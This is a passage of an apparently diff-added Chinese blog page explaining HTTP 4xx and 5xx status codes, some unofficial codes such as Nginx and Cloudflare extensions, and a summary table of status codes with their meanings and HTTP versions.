+<p>如果错误发生时客户端正在传送数据，那么使用TCP的服务器实现应当仔细确保在关闭客户端与服务器之间的连接之前，客户端已经收到了包含错误信息的数据包。如果客户端在收到错误信息后继续向服务器发送数据，服务器的TCP栈将向客户端发送一个重置数据包，以清除该客户端所有还未识别的输入缓冲，以免这些数据被服务器上的应用程序读取并干扰后者。</p>
+<h3 id="400-Bad-Request"><a href="#400-Bad-Request" class="headerlink" title="400 Bad Request"></a>400 Bad Request</h3><p>由于明显的客户端错误（例如，格式错误的请求语法，太大的大小，无效的请求消息或欺骗性路由请求），服务器不能或不会处理该请求。[31]</p>
+<h3 id="401-Unauthorized"><a href="#401-Unauthorized" class="headerlink" title="401 Unauthorized"></a>401 Unauthorized</h3><p>参见：HTTP基本认证、HTTP摘要认证 类似于403 Forbidden，401语义即“未认证”，即用户没有必要的凭据。[32]该状态码表示当前请求需要用户验证。该响应必须包含一个适用于被请求资源的WWW-Authenticate信息头用以询问用户信息。客户端可以重复提交一个包含恰当的Authorization头信息的请求。[33]如果当前请求已经包含了Authorization证书，那么401响应代表着服务器验证已经拒绝了那些证书。如果401响应包含了与前一个响应相同的身份验证询问，且浏览器已经至少尝试了一次验证，那么浏览器应当向用户展示响应中包含的实体信息，因为这个实体信息中可能包含了相关诊断信息。 注意：当网站（通常是网站域名）禁止IP地址时，有些网站状态码显示的401，表示该特定地址被拒绝访问网站。</p>
+<h3 id="402-Payment-Required"><a href="#402-Payment-Required" class="headerlink" title="402 Payment Required"></a>402 Payment Required</h3><p>该状态码是为了将来可能的需求而预留的。该状态码最初的意图可能被用作某种形式的数字现金或在线支付方案的一部分，但几乎没有哪家服务商使用，而且这个状态码通常不被使用。如果特定开发人员已超过请求的每日限制，Google Developers API会使用此状态码。[34]</p>
+<h3 id="403-Forbidden"><a href="#403-Forbidden" class="headerlink" title="403 Forbidden"></a>403 Forbidden</h3><p>主条目：HTTP 403 服务器已经理解请求，但是拒绝执行它。与401响应不同的是，身份验证并不能提供任何帮助，而且这个请求也不应该被重复提交。如果这不是一个HEAD请求，而且服务器希望能够讲清楚为何请求不能被执行，那么就应该在实体内描述拒绝的原因。当然服务器也可以返回一个404响应，假如它不希望让客户端获得任何信息。</p>
+<h3 id="404-Not-Found"><a href="#404-Not-Found" class="headerlink" title="404 Not Found"></a>404 Not Found</h3><p>主条目：HTTP 404 请求失败，请求所希望得到的资源未被在服务器上发现，但允许用户的后续请求。[35]没有信息能够告诉用户这个状况到底是暂时的还是永久的。假如服务器知道情况的话，应当使用410状态码来告知旧资源因为某些内部的配置机制问题，已经永久的不可用，而且没有任何可以跳转的地址。404这个状态码被广泛应用于当服务器不想揭示到底为何请求被拒绝或者没有其他适合的响应可用的情况下。</p>
+<h3 id="405-Method-Not-Allowed"><a href="#405-Method-Not-Allowed" class="headerlink" title="405 Method Not Allowed"></a>405 Method Not Allowed</h3><p>请求行中指定的请求方法不能被用于请求相应的资源。该响应必须返回一个Allow头信息用以表示出当前资源能够接受的请求方法的列表。例如，需要通过POST呈现数据的表单上的GET请求，或只读资源上的PUT请求。 鉴于PUT，DELETE方法会对服务器上的资源进行写操作，因而绝大部分的网页服务器都不支持或者在默认配置下不允许上述请求方法，对于此类请求均会返回405错误。</p>
+<h3 id="406-Not-Acceptable"><a href="#406-Not-Acceptable" class="headerlink" title="406 Not Acceptable"></a>406 Not Acceptable</h3><p>参见：内容协商 请求的资源的内容特性无法满足请求头中的条件，因而无法生成响应实体，该请求不可接受。[36] 除非这是一个HEAD请求，否则该响应就应当返回一个包含可以让用户或者浏览器从中选择最合适的实体特性以及地址栏表的实体。实体的格式由Content-Type头中定义的媒体类型决定。浏览器可以根据格式及自身能力自行作出最佳选择。但是，规范中并没有定义任何作出此类自动选择的标准。</p>
+<h3 id="407-Proxy-Authentication-Required"><a href="#407-Proxy-Authentication-Required" class="headerlink" title="407 Proxy Authentication Required"></a>407 Proxy Authentication Required</h3><p>与401响应类似，只不过客户端必须在代理服务器上进行身份验证。[37]代理服务器必须返回一个Proxy-Authenticate用以进行身份询问。客户端可以返回一个Proxy-Authorization信息头用以验证。</p>
+<h3 id="408-Request-Timeout"><a href="#408-Request-Timeout" class="headerlink" title="408 Request Timeout"></a>408 Request Timeout</h3><p>请求超时。根据HTTP规范，客户端没有在服务器预备等待的时间内完成一个请求的发送，客户端可以随时再次提交这一请求而无需进行任何更改。[38]</p>
+<h3 id="409-Conflict"><a href="#409-Conflict" class="headerlink" title="409 Conflict"></a>409 Conflict</h3><p>表示因为请求存在冲突无法处理该请求，例如多个同步更新之间的编辑冲突。</p>
+<h3 id="410-Gone"><a href="#410-Gone" class="headerlink" title="410 Gone"></a>410 Gone</h3><p>表示所请求的资源不再可用，将不再可用。当资源被有意地删除并且资源应被清除时，应该使用这个。在收到410状态码后，用户应停止再次请求资源。[39]但大多数服务端不会使用此状态码，而是直接使用404状态码。</p>
+<h3 id="411-Length-Required"><a href="#411-Length-Required" class="headerlink" title="411 Length Required"></a>411 Length Required</h3><p>服务器拒绝在没有定义Content-Length头的情况下接受请求。在添加了表明请求消息体长度的有效Content-Length头之后，客户端可以再次提交该请求。[40]</p>
+<h3 id="412-Precondition-Failed"><a href="#412-Precondition-Failed" class="headerlink" title="412 Precondition Failed"></a>412 Precondition Failed</h3><p>服务器在验证在请求的头字段中给出先决条件时，没能满足其中的一个或多个。[41]这个状态码允许客户端在获取资源时在请求的元信息（请求头字段数据）中设置先决条件，以此避免该请求方法被应用到其希望的内容以外的资源上。</p>
+<h3 id="413-Request-Entity-Too-Large"><a href="#413-Request-Entity-Too-Large" class="headerlink" title="413 Request Entity Too Large"></a>413 Request Entity Too Large</h3><p>前称“Request Entity Too Large”，表示服务器拒绝处理当前请求，因为该请求提交的实体数据大小超过了服务器愿意或者能够处理的范围。[42]此种情况下，服务器可以关闭连接以免客户端继续发送此请求。 如果这个状况是临时的，服务器应当返回一个Retry-After的响应头，以告知客户端可以在多少时间以后重新尝试。</p>
+<h3 id="414-Request-URI-Too-Long"><a href="#414-Request-URI-Too-Long" class="headerlink" title="414 Request-URI Too Long"></a>414 Request-URI Too Long</h3><p>前称“Request-URI Too Long”，[43]表示请求的URI长度超过了服务器能够解释的长度，因此服务器拒绝对该请求提供服务。通常将太多数据的结果编码为GET请求的查询字符串，在这种情况下，应将其转换为POST请求。[44]这比较少见，通常的情况包括： 本应使用POST方法的表单提交变成了GET方法，导致查询字符串过长。 重定向URI“黑洞”，例如每次重定向把旧的URI作为新的URI的一部分，导致在若干次重定向后URI超长。 客户端正在尝试利用某些服务器中存在的安全漏洞攻击服务器。这类服务器使用固定长度的缓冲读取或操作请求的URI，当GET后的参数超过某个数值后，可能会产生缓冲区溢出，导致任意代码被执行[45]。没有此类漏洞的服务器，应当返回414状态码。</p>
+<h3 id="415-Unsupported-Media-Type"><a href="#415-Unsupported-Media-Type" class="headerlink" title="415 Unsupported Media Type"></a>415 Unsupported Media Type</h3><p>对于当前请求的方法和所请求的资源，请求中提交的互联网媒体类型并不是服务器中所支持的格式，因此请求被拒绝。例如，客户端将图像上传格式为svg，但服务器要求图像使用上传格式为jpg。</p>
+<h3 id="416-Requested-Range-Not-Satisfiable"><a href="#416-Requested-Range-Not-Satisfiable" class="headerlink" title="416 Requested Range Not Satisfiable"></a>416 Requested Range Not Satisfiable</h3><p>前称“Requested Range Not Satisfiable”。[46]客户端已经要求文件的一部分（Byte serving），但服务器不能提供该部分。例如，如果客户端要求文件的一部分超出文件尾端。[47]</p>
+<h3 id="417-Expectation-Failed"><a href="#417-Expectation-Failed" class="headerlink" title="417 Expectation Failed"></a>417 Expectation Failed</h3><p>在请求头Expect中指定的预期内容无法被服务器满足，或者这个服务器是一个代理服显的证据证明在当前路由的下一个节点上，Expect的内容无法被满足。[48]</p>
+<h3 id="418-I’m-a-teapot"><a href="#418-I’m-a-teapot" class="headerlink" title="418 I’m a teapot"></a>418 I’m a teapot</h3><p>本操作码是在1998年作为IETF的传统愚人节笑话, 在RFC 2324超文本咖啡壶控制协议’中定义的，并不需要在真实的HTTP服务器中定义。当一个控制茶壶的HTCPCP收到BREW或POST指令要求其煮咖啡时应当回传此错误。[49]这个HTTP状态码在某些网站（包括Google.com）与项目（如Node.js、ASP.NET和Go语言）中用作彩蛋。[50]</p>
+<h3 id="420-Enhance-Your-Caim"><a href="#420-Enhance-Your-Caim" class="headerlink" title="420 Enhance Your Caim"></a>420 Enhance Your Caim</h3><p>Twitter Search与Trends API在客户端被限速的情况下返回。</p>
+<h3 id="421-Misdirected-Request"><a href="#421-Misdirected-Request" class="headerlink" title="421 Misdirected Request"></a>421 Misdirected Request</h3><p>该请求针对的是无法产生响应的服务器（例如因为连接重用）。[51]</p>
+<h3 id="422-Unprocessable-Entity"><a href="#422-Unprocessable-Entity" class="headerlink" title="422 Unprocessable Entity"></a>422 Unprocessable Entity</h3><p>请求格式正确，但是由于含有语义错误，无法响应。[15]</p>
+<h3 id="423-Locked"><a href="#423-Locked" class="headerlink" title="423 Locked"></a>423 Locked</h3><p>当前资源被锁定。[15]</p>
+<h3 id="424-Failed-Dependency"><a href="#424-Failed-Dependency" class="headerlink" title="424 Failed Dependency"></a>424 Failed Dependency</h3><p>由于之前的某个请求发生的错误，导致当前请求失败，例如PROPPATCH。[15]</p>
+<h3 id="425-Unordered-Collection"><a href="#425-Unordered-Collection" class="headerlink" title="425 Unordered Collection"></a>425 Unordered Collection</h3><p>在WebDAV Advanced Collections Protocol中定义，但Web Distributed Authoring and Versioning (WebDAV) Ordered Collections Protocol中并不存在。</p>
+<h3 id="426-Upgrade-Required"><a href="#426-Upgrade-Required" class="headerlink" title="426 Upgrade Required"></a>426 Upgrade Required</h3><p>客户端应当切换到TLS&#x2F;1.0，并在HTTP&#x2F;1.1 Upgrade header中给出。[15]</p>
+<h3 id="428-Precondition-Required"><a href="#428-Precondition-Required" class="headerlink" title="428 Precondition Required"></a>428 Precondition Required</h3><p>原服务器要求该请求满足一定条件。这是为了防止“‘未更新’问题，即客户端读取（GET）一个资源的状态，更改它，并将它写（PUT）回服务器，但这期间第三方已经在服务器上更改了该资源的状态，因此导致了冲突。”[52]</p>
+<h3 id="429-Too-Many-Requests"><a href="#429-Too-Many-Requests" class="headerlink" title="429 Too Many Requests"></a>429 Too Many Requests</h3><p>用户在给定的时间内发送了太多的请求。旨在用于网络限速。[52]</p>
+<h3 id="431-Request-Header-Fields-Too-Large"><a href="#431-Request-Header-Fields-Too-Large" class="headerlink" title="431 Request Header Fields Too Large"></a>431 Request Header Fields Too Large</h3><p>服务器不愿处理请求，因为一个或多个头字段过大。[52]</p>
+<h3 id="444-No-Response"><a href="#444-No-Response" class="headerlink" title="444 No Response"></a>444 No Response</h3><p>Nginx上HTTP服务器扩展。服务器不向客户端返回任何信息，并关闭连接（有助于阻止恶意软件）。</p>
+<h3 id="450-Blocked-by-Windows-Parental-Controls"><a href="#450-Blocked-by-Windows-Parental-Controls" class="headerlink" title="450 Blocked by Windows Parental Controls"></a>450 Blocked by Windows Parental Controls</h3><p>这是一个由Windows家庭控制（Microsoft）HTTP阻止的450状态代码的示例，用于信息和测试。</p>
+<h3 id="451-Unavailable-For-Legal-Reasons"><a href="#451-Unavailable-For-Legal-Reasons" class="headerlink" title="451 Unavailable For Legal Reasons"></a>451 Unavailable For Legal Reasons</h3><p>主条目：HTTP 451 该访问因法律的要求而被拒绝，由IETF在2015核准后新增加。[53][54][55]</p>
+<h3 id="494-Request-Header-Too-Large"><a href="#494-Request-Header-Too-Large" class="headerlink" title="494 Request Header Too Large"></a>494 Request Header Too Large</h3><p>在错误代码431提出之前Nginx上使用的扩展HTTP代码。</p>
+<h2 id="5xx服务器错误"><a href="#5xx服务器错误" class="headerlink" title="5xx服务器错误"></a>5xx服务器错误</h2><p>表示服务器无法完成明显有效的请求。[56]这类状态码代表了服务器在处理请求的过程中有错误或者异常状态发生，也有可能是服务器意识到以当前的软硬件资源无法完成对请求的处理。除非这是一个HEAD请求，否则服务器应当包含一个解释当前错误状态以及这个状况是临时的还是永久的解释信息实体。浏览器应当向用户展示任何在当前响应中被包含的实体。这些状态码适用于任何响应方法。[57]</p>
+<h3 id="500-Internal-Server-Error"><a href="#500-Internal-Server-Error" class="headerlink" title="500 Internal Server Error"></a>500 Internal Server Error</h3><p>通用错误消息，服务器遇到了一个未曾预料的状况，导致了它无法完成对请求的处理。没有给出具体错误信息。[58]</p>
+<h3 id="501-Not-Implemented"><a href="#501-Not-Implemented" class="headerlink" title="501 Not Implemented"></a>501 Not Implemented</h3><p>服务器不支持当前请求所需要的某个功能。当服务器无法识别请求的方法，并且无法支持其对任何资源的请求。[59]（例如，网络服务API的新功能）</p>
+<h3 id="502-Bad-Gateway"><a href="#502-Bad-Gateway" class="headerlink" title="502 Bad Gateway"></a>502 Bad Gateway</h3><p>作为网关或者代理工作的服务器尝试执行请求时，从上游服务器接收到无效的响应。[60]</p>
+<h3 id="503-Service-Unavailable"><a href="#503-Service-Unavailable" class="headerlink" title="503 Service Unavailable"></a>503 Service Unavailable</h3><p>由于临时的服务器维护或者过载，服务器当前无法处理请求。这个状况是暂时的，并且将在一段时间以后恢复。[61]如果能够预计延迟时间，那么响应中可以包含一个Retry-After头用以标明这个延迟时间。如果没有给出这个Retry-After信息，那么客户端应当以处理500响应的方式处理它。</p>
+<h3 id="504-Gateway-Timeout"><a href="#504-Gateway-Timeout" class="headerlink" title="504 Gateway Timeout"></a>504 Gateway Timeout</h3><p>作为网关或者代理工作的服务器尝试执行请求时，未能及时从上游服务器（URI标识出的服务器，例如HTTP、FTP、LDAP）或者辅助服务器（例如DNS）收到响应。[62] 注意：某些代理服务器在DNS查询超时时会返回400或者500错误。</p>
+<h3 id="505-HTTP-Version-Not-Supported"><a href="#505-HTTP-Version-Not-Supported" class="headerlink" title="505 HTTP Version Not Supported"></a>505 HTTP Version Not Supported</h3><p>服务器不支持，或者拒绝支持在请求中使用的HTTP版本。[63]这暗示着服务器不能或不愿使用与客户端相同的版本。响应中应当包含一个描述了为何版本不被支持以及服务器支持哪些协议的实体。</p>
+<h3 id="506-Variant-Also-Negotiates"><a href="#506-Variant-Also-Negotiates" class="headerlink" title="506 Variant Also Negotiates"></a>506 Variant Also Negotiates</h3><p>由《透明内容协商协议》（RFC 2295）扩展，代表服务器存在内部配置错误，[64]被请求的协商变元资源被配置为在透明内容协商中使用自己，因此在一个协商处理中不是一个合适的重点。</p>
+<h3 id="507-Insufficient-Storage"><a href="#507-Insufficient-Storage" class="headerlink" title="507 Insufficient Storage"></a>507 Insufficient Storage</h3><p>服务器无法存储完成请求所必须的内容。这个状况被认为是临时的。[15]</p>
+<h3 id="508-Loop-Detected"><a href="#508-Loop-Detected" class="headerlink" title="508 Loop Detected"></a>508 Loop Detected</h3><p>服务器在处理请求时陷入死循环。 （可代替 208状态码）</p>
+<h3 id="510-Not-Extended"><a href="#510-Not-Extended" class="headerlink" title="510 Not Extended"></a>510 Not Extended</h3><p>获取资源所需要的策略并没有被满足。[65]</p>
+<h3 id="511-Network-Authentication-Required"><a href="#511-Network-Authentication-Required" class="headerlink" title="511 Network Authentication Required"></a>511 Network Authentication Required</h3><p>客户端需要进行身份验证才能获得网络访问权限，旨在限制用户群访问特定网络。（例如连接WiFi热点时的强制网络门户）[52]</p>
+<h2 id="非官方状态码"><a href="#非官方状态码" class="headerlink" title="非官方状态码"></a>非官方状态码</h2><h3 id="420-Enhance-Your-Calm"><a href="#420-Enhance-Your-Calm" class="headerlink" title="420 Enhance Your Calm"></a>420 Enhance Your Calm</h3><p>据说早期 Twitter API 会在短期内提交太多需求的时候回传这个 Status Code，不过在新版 API 改为使用 429 Too Many Requests。</p>
+<h3 id="498-Invalid-Token"><a href="#498-Invalid-Token" class="headerlink" title="498 Invalid Token"></a>498 Invalid Token</h3><h3 id="499-Token-Required"><a href="#499-Token-Required" class="headerlink" title="499 Token Required"></a>499 Token Required</h3><p>这两个是以前一个叫做 ArcGIS for Server 的系统会回应的 Status Code。一般来说验证信息错误还是会回传 401 Unathorized。</p>
+<h3 id="520-Unknown-Error"><a href="#520-Unknown-Error" class="headerlink" title="520 Unknown Error"></a>520 Unknown Error</h3><p>Cloudflare 会用的未知错误。</p>
+<h3 id="521-Web-Server-Is-Down"><a href="#521-Web-Server-Is-Down" class="headerlink" title="521 Web Server Is Down"></a>521 Web Server Is Down</h3><p>指目标服务器挂了，一般在一些CDN上会出现（例如Cloudflare）</p>
+<hr>
+<h1 id="http状态码的逻辑关系图"><a href="#http状态码的逻辑关系图" class="headerlink" title="http状态码的逻辑关系图"></a>http状态码的逻辑关系图</h1><p><img src="https://config.net.cn/images/tools/httpstatus/httpstatuscode.png" alt="http状态码的逻辑关系图"></p>
+<h2 id="http状态码"><a href="#http状态码" class="headerlink" title="http状态码"></a>http状态码</h2><p>HTTP状态码(响应码)用来表明HTTP请求是否已经成功完成.HTTP响应类型一共分五大类:消息响应,成功响应,重定向,客户端错误,服务器端错误.</p>
+<p>下表列出了所有HTTP状态码,以及他们各自所代表的含义:</p>
+<table>
+<thead>
+<tr>
+<th align="center">状态码</th>
+<th align="left">原因短语</th>
+<th align="left">代表含义</th>
+<th align="left">HTTP 版本</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">消息响应</td>
+<td align="left"></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="center">100</td>
+<td align="left">Continue (继续)</td>
+<td align="left">客户端应当继续发送请求.这个临时响应是用来通知客户端它的部分请求已经被服务器接收,且仍未被拒绝.客户端应当继续发送请求的剩余部分,或者如果请求已经完成,忽略这个响应.服务器必须在请求完成后向客户端发送一个最终响应.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">101</td>
+<td align="left">Switching Protocol (切换协议)</td>
+<td align="left">服务器已经理解了客户端的请求，并将通过Upgrade消息头通知客户端采用不同的协议来完成这个请求。在发送完这个响应最后的空行后，服务器将会切换到 在Upgrade消息头中定义的那些协议。: 只有在切换新的协议更有好处的时候才应该采取类似措施。例如，切换到新的HTTP版本比旧版本更有优势，或者切换到一个实时且同步的协议以传送利用此类特 性的资源。</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">成功响应</td>
+<td align="left"></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="center">200</td>
+<td align="left">OK (成功)</td>
+<td align="left">请求成功.成功的意义根据请求所使用的方法不同而不同.GET: 资源已被提取,并作为响应体传回客户端.HEAD: 实体头已作为响应头传回客户端POST: 经过服务器处理客户端传来的数据,适合的资源作为响应体传回客户端.TRACE: 服务器收到请求消息作为响应体传回客户端.</td>
+<td align="left">HTTP&#x2F;0.9 可用</td>
+</tr>
+<tr>
+<td align="center">201</td>
+<td align="left">Created (已创建)</td>
+<td align="left">请求成功，而且有一个新的资源已经依据请求的需要而建立，通常这是 PUT 方法得到的响应码.</td>
+<td align="left">HTTP&#x2F;0.9 可用</td>
+</tr>
+<tr>
+<td align="center">202</td>
+<td align="left">Accepted (已创建)</td>
+<td align="left">服务器已接受请求，但尚未处理。正如它可能被拒绝一样，最终该请求可能会也可能不会被执行。在异步操作的场合下，没有比发送这个状态码更方便的做法了。:返回202状态码的响应的目的是允许服务器接受其他过程的请求（例如某个每天只执行一次的基于批处理的操作），而不必让客户端一直保持与服务器的连接直到批处理操作全部完成。在接受请求处理并返回202状态码的响应应当在返回的实体中包含一些指示处理当前状态的信息，以及指向处理状态监视器或状态预测的指针，以便用户能够估计操作是否已经完成。</td>
+<td align="left">HTTP&#x2F;0.9 可用</td>
+</tr>
+<tr>
+<td align="center">203</td>
+<td align="left">Non-Authoritative Information (未授权信息)</td>
+<td align="left">服务器已成功处理了请求,但返回的实体头部元信息不是在原始服务器上有效的确定集合，而是来自本地或者第三方的拷贝,如果不是上述情况,使用200状态码才是最合适的.</td>
+<td align="left">HTTP&#x2F;0.9 and 1.1</td>
+</tr>
+<tr>
+<td align="center">204</td>
+<td align="left">No Content (无内容)</td>
+<td align="left">该响应没有响应内容,只有响应头,响应头也可能是有用的.用户代理可以根据新的响应头来更新对应资源的缓存信息.</td>
+<td align="left">HTTP&#x2F;0.9 可用</td>
+</tr>
+<tr>
+<td align="center">205</td>
+<td align="left">Reset Content (重置内容)</td>
+<td align="left">告诉用户代理去重置发送该请求的窗口的文档视图.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">206</td>
+<td align="left">Partial Content (部分内容)</td>
+<td align="left">当客户端通过使用range头字段进行文件分段下载时使用该状态码</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">重定向</td>
+<td align="left"></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="center">300</td>
+<td align="left">Multiple Choice (多种选择)</td>
+<td align="left">该请求有多种可能的响应,用户代理或者用户必须选择它们其中的一个.服务器没有任何标准可以遵循去代替用户来进行选择.</td>
+<td align="left">HTTP&#x2F;1.0 and later</td>
+</tr>
+<tr>
+<td align="center">301</td>
+<td align="left">Moved Permanently (永久移动)</td>
+<td align="left">该状态码表示所请求的URI资源路径已经改变,新的URL会在响应的<code>Location</code>:头字段里找到.</td>
+<td align="left">HTTP&#x2F;0.9 可用</td>
+</tr>
+<tr>
+<td align="center">302</td>
+<td align="left">Found (临时移动)</td>
+<td align="left">该状态码表示所请求的URI资源路径临时改变,并且还可能继续改变.因此客户端在以后访问时还得继续使用该URI.新的URL会在响应的<code>Location:</code>头字段里找到.</td>
+<td align="left">HTTP&#x2F;0.9 可用</td>
+</tr>
+<tr>
+<td align="center">303</td>
+<td align="left">See Other (查看其他位置)</td>
+<td align="left">服务器发送该响应用来引导客户端使用GET方法访问另外一个URI.</td>
+<td align="left">HTTP&#x2F;0.9 and 1.1</td>
+</tr>
+<tr>
+<td align="center">304</td>
+<td align="left">Not Modified (未修改)</td>
+<td align="left">告诉客户端,所请求的内容距离上次访问并没有变化. 客户端可以直接从浏览器缓存里获取该资源.</td>
+<td align="left">HTTP&#x2F;0.9 可用</td>
+</tr>
+<tr>
+<td align="center">305</td>
+<td align="left">Use Proxy (使用代理)</td>
+<td align="left">所请求的资源必须统过代理才能访问到.由于安全原因,该状态码并未受到广泛支持.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">306</td>
+<td align="left"><em>unused</em> (未使用)</td>
+<td align="left">这个状态码已经不再被使用,当初它被用在HTTP 1.1规范的旧版本中.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">307</td>
+<td align="left">Temporary Redirect (临时重定向)</td>
+<td align="left">服务器发送该响应用来引导客户端使用相同的方法访问另外一个URI来获取想要获取的资源.新的URL会在响应的<code>Location:</code>头字段里找到.与302状态码有相同的语义,且前后两次访问必须使用相同的方法(GET POST).</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">308</td>
+<td align="left">Permanent Redirect (永久重定向)</td>
+<td align="left">所请求的资源将永久的位于另外一个URI上.新的URL会在响应的<code>Location:</code>头字段里找到.与301状态码有相同的语义,且前后两次访问必须使用相同的方法(GET POST).</td>
+<td align="left">HTTPbis (试验草案)</td>
+</tr>
+<tr>
+<td align="center">客户端错误</td>
+<td align="left"></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="center">400</td>
+<td align="left">Bad Request (错误请求)</td>
+<td align="left">因发送的请求语法错误,服务器无法正常读取.</td>
+<td align="left">HTTP&#x2F;0.9 可用</td>
+</tr>
+<tr>
+<td align="center">401</td>
+<td align="left">Unauthorized (未授权)</td>
+<td align="left">需要身份验证后才能获取所请求的内容,类似于403错误.不同点是.401错误后,只要正确输入帐号密码,验证即可通过.</td>
+<td align="left">HTTP&#x2F;0.9 可用</td>
+</tr>
+<tr>
+<td align="center">402</td>
+<td align="left">Payment Required (需要付款)</td>
+<td align="left">该状态码被保留以供将来使用.创建此代码最初的目的是为数字支付系统而用,然而,到现在也没投入使用.</td>
+<td align="left">HTTP&#x2F;0.9 and 1.1</td>
+</tr>
+<tr>
+<td align="center">403</td>
+<td align="left">Forbidden (禁止访问)</td>
+<td align="left">客户端没有权利访问所请求内容,服务器拒绝本次请求.</td>
+<td align="left">HTTP&#x2F;0.9 可用</td>
+</tr>
+<tr>
+<td align="center">404</td>
+<td align="left">Not Found (未找到)</td>
+<td align="left">服务器找不到所请求的资源.由于经常发生此种情况,所以该状态码在上网时是非常常见的.</td>
+<td align="left">HTTP&#x2F;0.9 可用</td>
+</tr>
+<tr>
+<td align="center">405</td>
+<td align="left">Method Not Allowed (不允许使用该方法)</td>
+<td align="left">该请求使用的方法被服务器端禁止使用,RFC2616中规定, <code>GET</code> 和 <code>HEAD</code> 方法不能被禁止.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">406</td>
+<td align="left">Not Acceptable (无法接受)</td>
+<td align="left">在进行服务器驱动内容协商后,没有发现合适的内容传回给客户端.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">407</td>
+<td align="left">Proxy Authentication Required (要求代理身份验证)</td>
+<td align="left">类似于状态码 401,不过需要通过代理才能进行验证.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">408</td>
+<td align="left">Request Timeout (请求超时)</td>
+<td align="left">客户端没有在服务器预备等待的时间内完成一个请求的发送.这意味着服务器将会切断和客户端的连接. 在其他浏览器中,这种响应更常见一些, 例如Chrome 和 IE9, 目的是为了使用HTTP 预连机制加快浏览速度. 同时注意,一些服务器不发送此种响应就直接切断连接.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">409</td>
+<td align="left">Conflict (冲突)</td>
+<td align="left">该请求与服务器的当前状态所冲突.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">410</td>
+<td align="left">Gone (已失效)</td>
+<td align="left">所请求的资源已经被删除.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">411</td>
+<td align="left">Length Required (需要内容长度头)</td>
+<td align="left">因服务器在本次请求中需要 <code>Content-Length</code> 头字段,而客户端没有发送.所以,服务器拒绝了该请求.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">412</td>
+<td align="left">Precondition Failed (预处理失败)</td>
+<td align="left">服务器没能满足客户端在获取资源时在请求头字段中设置的先决条件.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">413</td>
+<td align="left">Request Entity Too Large (请求实体过长)</td>
+<td align="left">请求实体大小超过服务器的设置的最大限制,服务器可能会关闭HTTP链接并返回<code>Retry-After</code> 头字段.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">414</td>
+<td align="left">Request-URI Too Long (请求网址过长)</td>
+<td align="left">客户端请求所包含的URI地址太长,以至于服务器无法处理.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">415</td>
+<td align="left">Unsupported Media Type (媒体类型不支持)</td>
+<td align="left">服务器不支持客户端所请求的媒体类型,因此拒绝该请求.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">416</td>
+<td align="left">Requested Range Not Satisfiable (请求范围不合要求)</td>
+<td align="left">请求中包含的<code>Range</code>头字段无法被满足,通常是因为<code>Range</code>中的数字范围超出所请求资源的大小.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">417</td>
+<td align="left">Expectation Failed (预期结果失败)</td>
+<td align="left">在请求头<code> Expect</code> 中指定的预期内容无法被服务器满足.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">418</td>
+<td align="left">I’m a teapot (服务端拒绝用茶壶煮咖啡)</td>
+<td align="left">超文本咖啡壶控制协议（英语：Hyper Text Coffee Pot Control Protocol，缩写HTCPCP）是由IETF虚构的一种协议。这个协议在文档RFC 2324（1998年4月1日发布）中定义，是一个恶搞RFC。 该协议被设计为一个类似HTTP的协议，可以用于控制、监测和诊断咖啡壶，后来也被拓展到茶壶；该协议有时也可以视作一种早期的物联网实验。</td>
+<td align="left">HTCPCP 可用</td>
+</tr>
+<tr>
+<td align="center">服务器端错误</td>
+<td align="left"></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="center">500</td>
+<td align="left">Internal Server Error (内部服务器错误)</td>
+<td align="left">服务器遇到未知的无法解决的问题.</td>
+<td align="left">HTTP&#x2F;0.9 可用</td>
+</tr>
+<tr>
+<td align="center">501</td>
+<td align="left">Not Implemented (未实现)</td>
+<td align="left">服务器不支持该请求中使用的方法,比如<code>POST</code> 和 <code>PUT.只有``GET</code> 和 <code>HEAD</code> 是RFC2616规范中规定服务器必须实现的方法.</td>
+<td align="left">HTTP&#x2F;0.9 可用</td>
+</tr>
+<tr>
+<td align="center">502</td>
+<td align="left">Bad Gateway (网关错误)</td>
+<td align="left">服务器作为网关且从上游服务器获取到了一个无效的HTTP响应.</td>
+<td align="left">HTTP&#x2F;0.9 可用</td>
+</tr>
+<tr>
+<td align="center">503</td>
+<td align="left">Service Unavailable (服务不可用)</td>
